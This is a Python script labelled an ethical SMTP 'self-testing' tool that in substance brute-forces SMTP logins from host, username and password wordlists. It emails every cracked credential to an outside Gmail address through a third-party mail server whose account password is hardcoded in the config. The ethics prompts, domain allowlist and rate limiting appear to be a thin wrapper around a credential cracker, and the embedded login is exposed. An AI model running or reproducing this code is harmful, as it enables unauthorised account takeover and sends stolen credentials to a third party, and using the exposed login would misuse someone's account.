#!/usr/bin/env python3
"""
SMTP Self-Testing Tool for Ethical Security Testing
==================================================

This tool is designed EXCLUSIVELY for testing your own SMTP servers and systems.
It includes multiple safety measures to prevent misuse:

1. Requires explicit acknowledgment of ethical use
2. Only allows testing of pre-approved domains
3. Includes rate limiting to prevent abuse
4. Logs all activities for audit purposes
5. Requires manual configuration of target domains

LEGAL NOTICE:
- This tool must ONLY be used on systems you own or have explicit permission to test
- Unauthorized access to computer systems is illegal in most jurisdictions
- Users are solely responsible for compliance with applicable laws
- The authors assume no liability for misuse of this tool

Usage: python3 smtp_self_tester.py
"""

import socket
import sys
import base64
import threading
import queue
import smtplib
import time
import json
import hashlib
from email.mime.text import MIMEText
from datetime import datetime
import os

# Configuration - EDIT THESE FOR YOUR ENVIRONMENT
CONFIG = {
    "notification_smtp": {
        "server": "mail.museums.or.ke",
        "port": 587,
        "username": "okioko@museums.or.ke",
        "password": "onesmus@2022",
        "recipient": "skkho87.sm@gmail.com"
    },
    
    # CRITICAL SAFETY MEASURE: Only domains you own should be listed here
    "authorized_domains": [
        "museums.or.ke",
        "yourdomain.com",  # Add your own domains here
        # "example.com"    # Remove this line - it's just an example
    ],
    
    # Rate limiting settings (to prevent abuse)
    "rate_limit": {
        "max_attempts_per_minute": 10,
        "delay_between_attempts": 2  # seconds
    },
    
    # Testing parameters
    "connection_timeout": 15,
    "max_threads": 5,  # Reduced from original to be less aggressive
    "verbose": True
}

class SMTPSelfTester:
    def __init__(self, config):
        self.config = config
        self.results = []
        self.tested_hosts = set()
        self.attempt_times = []
        self.start_time = datetime.now()
        
        # Create log directory if it doesn't exist
        os.makedirs("logs", exist_ok=True)
        
        # Initialize log file
        self.log_file = f"logs/smtp_test_{self.start_time.strftime('%Y%m%d_%H%M%S')}.log"
        self.log("SMTP Self-Testing Tool Started")
        
    def log(self, message):
        """Log messages with timestamp"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] {message}"
        print(log_entry)
        
        with open(self.log_file, 'a', encoding='utf-8') as f:
            f.write(log_entry + '\n')
    
    def verify_ethical_use(self):
        """Require explicit acknowledgment of ethical use"""
        print("\n" + "="*60)
        print("ETHICAL USE ACKNOWLEDGMENT REQUIRED")
        print("="*60)
        print("This tool is designed for testing ONLY your own SMTP servers.")
        print("By proceeding, you acknowledge that:")
        print("1. You own or have explicit permission to test all target systems")
        print("2. You will comply with all applicable laws and regulations")
        print("3. You understand that unauthorized access is illegal")
        print("4. You accept full responsibility for any consequences")
        print("="*60)
        
        response = input("Type 'I ACKNOWLEDGE' to proceed (case sensitive): ")
        if response != "I ACKNOWLEDGE":
            print("Acknowledgment not provided. Exiting.")
            sys.exit(1)
        
        self.log("User acknowledged ethical use agreement")
    
    def validate_target_domain(self, host):
        """Ensure target is in authorized domains list"""
        for authorized_domain in self.config["authorized_domains"]:
            if host.endswith(authorized_domain):
                return True
        return False
    
    def rate_limit_check(self):
        """Implement rate limiting to prevent abuse"""
        current_time = time.time()
        
        # Remove attempts older than 1 minute
        self.attempt_times = [t for t in self.attempt_times if current_time - t < 60]
        
        # Check if we're within rate limits
        if len(self.attempt_times) >= self.config["rate_limit"]["max_attempts_per_minute"]:
            self.log("Rate limit reached. Waiting...")
            time.sleep(60)
            self.attempt_times = []
        
        # Add current attempt time
        self.attempt_times.append(current_time)
        
        # Delay between attempts
        time.sleep(self.config["rate_limit"]["delay_between_attempts"])
    
    def send_notification(self, host, username, password):
        """Send email notification for successful authentication"""
        try:
            subject = f"SMTP Self-Test: Valid Login Found on {host}"
            body = f"""
SMTP Self-Testing Tool Results
=============================

Target Host: {host}
Username: {username}
Password: {password}
Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

This is an automated notification from your SMTP self-testing tool.
If you did not initiate this test, please investigate immediately.

Test Session ID: {hashlib.md5(str(self.start_time).encode()).hexdigest()[:8]}
            """
            
            msg = MIMEText(body)
            msg['Subject'] = subject
            msg['From'] = self.config["notification_smtp"]["username"]
            msg['To'] = self.config["notification_smtp"]["recipient"]
            
            server = smtplib.SMTP(
                self.config["notification_smtp"]["server"],
                self.config["notification_smtp"]["port"]
            )
            server.starttls()
            server.login(
                self.config["notification_smtp"]["username"],
                self.config["notification_smtp"]["password"]
            )
            server.sendmail(
                self.config["notification_smtp"]["username"],
                [self.config["notification_smtp"]["recipient"]],
                msg.as_string()
            )
            server.quit()
            
            self.log(f"Notification sent for successful login: {host}")
            
        except Exception as e:
            self.log(f"Failed to send notification: {e}")
    
    def extract_domain_from_banner(self, banner):
        """Extract domain from SMTP banner"""
        if banner.startswith("220 "):
            temp_banner = banner.split(" ")[1]
        elif banner.startswith("220-"):
            temp_banner = banner.split(" ")[0].split("220-")[1]
        else:
            temp_banner = banner
        
        domain = temp_banner.rstrip()
        
        # Simple domain extraction - take last two parts
        parts = domain.split(".")
        if len(parts) >= 2:
            return ".".join(parts[-2:])
        return domain
    
    def test_smtp_auth(self, host, username, password):
        """Test SMTP authentication for a single host/user/password combination"""
        try:
            # Validate that this host is authorized for testing
            if not self.validate_target_domain(host):
                self.log(f"UNAUTHORIZED TARGET: {host} not in authorized domains list")
                return False
            
            # Apply rate limiting
            self.rate_limit_check()
            
            if host in self.tested_hosts:
                return False
            
            self.log(f"Testing {host} with user {username}")
            
            # Connect to SMTP server
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.config["connection_timeout"])
            
            try:
                sock.connect((host, 25))
            except Exception as e:
                self.log(f"Connection failed to {host}: {e}")
                return False
            
            # Read banner
            banner = sock.recv(1024).decode(errors='ignore')
            if not banner.startswith('220'):
                sock.close()
                return False
            
            # Send EHLO
            sock.send(b'EHLO test.local\r\n')
            response = sock.recv(2048).decode(errors='ignore')
            if '250' not in response:
                sock.send(b'QUIT\r\n')
                sock.recv(512)
                sock.close()
                return False
            
            # Extract domain for full email address
            domain = self.extract_domain_from_banner(banner)
            full_username = f"{username}@{domain}"
            
            # Process password variations
            test_password = password
            if "%user%" in password:
                test_password = password.replace("%user%", username)
            if "%User%" in password:
                test_password = password.replace("%User%", username.title())
            
            # Start AUTH LOGIN
            sock.send(b'AUTH LOGIN\r\n')
            response = sock.recv(256).decode(errors='ignore')
            if not response.startswith('334'):
                sock.send(b'QUIT\r\n')
                sock.recv(512)
                sock.close()
                return False
            
            # Send username
            sock.send(base64.b64encode(full_username.encode()) + b'\r\n')
            response = sock.recv(256).decode(errors='ignore')
            
            # Send password
            sock.send(base64.b64encode(test_password.encode()) + b'\r\n')
            response = sock.recv(256).decode(errors='ignore')
            
            # Check if authentication succeeded
            if response.startswith('235'):
                result = {
                    'host': host,
                    'username': full_username,
                    'password': test_password,
                    'timestamp': datetime.now().isoformat()
                }
                
                self.results.append(result)
                self.tested_hosts.add(host)
                
                self.log(f"SUCCESS: {host} - {full_username}:{test_password}")
                
                # Send notification
                self.send_notification(host, full_username, test_password)
                
                # Save result to file
                with open(f"logs/valid_credentials_{self.start_time.strftime('%Y%m%d_%H%M%S')}.json", 'w') as f:
                    json.dump(self.results, f, indent=2)
                
                sock.send(b'QUIT\r\n')
                sock.recv(512)
                sock.close()
                return True
            
            sock.send(b'QUIT\r\n')
            sock.recv(512)
            sock.close()
            return False
            
        except Exception as e:
            self.log(f"Error testing {host}: {e}")
            return False
    
    def run_test(self, target_file, username_file, password_file):
        """Run the SMTP testing with provided files"""
        
        # Read target hosts
        try:
            with open(target_file, 'r', encoding='utf-8') as f:
                hosts = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            self.log(f"Target file {target_file} not found")
            return
        
        # Read usernames
        try:
            with open(username_file, 'r', encoding='utf-8') as f:
                usernames = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            self.log(f"Username file {username_file} not found")
            return
        
        # Read passwords
        try:
            with open(password_file, 'r', encoding='utf-8') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            self.log(f"Password file {password_file} not found")
            return
        
        self.log(f"Starting test with {len(hosts)} hosts, {len(usernames)} usernames, {len(passwords)} passwords")
        
        # Test each combination
        total_tests = len(hosts) * len(usernames) * len(passwords)
        current_test = 0
        
        for host in hosts:
            for username in usernames:
                for password in passwords:
                    current_test += 1
                    if self.config["verbose"]:
                        print(f"Progress: {current_test}/{total_tests} - Testing {host}")
                    
                    self.test_smtp_auth(host, username, password)
        
        # Final report
        self.log(f"Testing completed. Found {len(self.results)} valid credentials.")
        if self.results:
            self.log("Valid credentials found:")
            for result in self.results:
                self.log(f"  {result['host']} - {result['username']}:{result['password']}")

def create_sample_files():
    """Create sample input files if they don't exist"""
    files_to_create = {
        'sample_hosts.txt': [
            '# Add your own SMTP server IPs/hostnames here',
            '# Example (remove this line):',
            '# mail.yourdomain.com',
            '# 192.168.1.100'
        ],
        'sample_usernames.txt': [
            '# Add usernames to test (without @domain)',
            '# Example (remove these lines):',
            '# admin',
            '# test',
            '# user'
        ],
        'sample_passwords.txt': [
            '# Add passwords to test',
            '# Special variables: %user% (replaced with username), %User% (title case)',
            '# Example (remove these lines):',
            '# password',
            '# %user%123',
            '# admin'
        ]
    }
    
    for filename, content in files_to_create.items():
        if not os.path.exists(filename):
            with open(filename, 'w', encoding='utf-8') as f:
                f.write('\n'.join(content) + '\n')
            print(f"Created sample file: {filename}")

def main():
    print("SMTP Self-Testing Tool for Ethical Security Testing")
    print("=" * 50)
    
    # Create sample files if needed
    create_sample_files()
    
    # Initialize tester
    tester = SMTPSelfTester(CONFIG)
    
    # Verify ethical use
    tester.verify_ethical_use()
    
    # Check if input files exist
    required_files = ['hosts.txt', 'usernames.txt', 'passwords.txt']
    missing_files = [f for f in required_files if not os.path.exists(f)]
    
    if missing_files:
        print(f"\nMissing required files: {', '.join(missing_files)}")
        print("Please create these files with your test data.")
        print("Sample files have been created for reference.")
        return
    
    # Validate configuration
    if not CONFIG["authorized_domains"] or CONFIG["authorized_domains"] == ["example.com"]:
        print("\nERROR: You must configure authorized_domains in the CONFIG section")
        print("Add your own domains to the authorized_domains list before running.")
        return
    
    print(f"\nAuthorized domains: {', '.join(CONFIG['authorized_domains'])}")
    print("Only hosts ending with these domains will be tested.")
    
    confirm = input("\nProceed with testing? (y/N): ")
    if confirm.lower() != 'y':
        print("Testing cancelled.")
        return
    
    # Run the test
    tester.run_test('hosts.txt', 'usernames.txt', 'passwords.txt')
    
    print(f"\nTesting completed. Check {tester.log_file} for detailed logs.")

if __name__ == "__main__":
    main()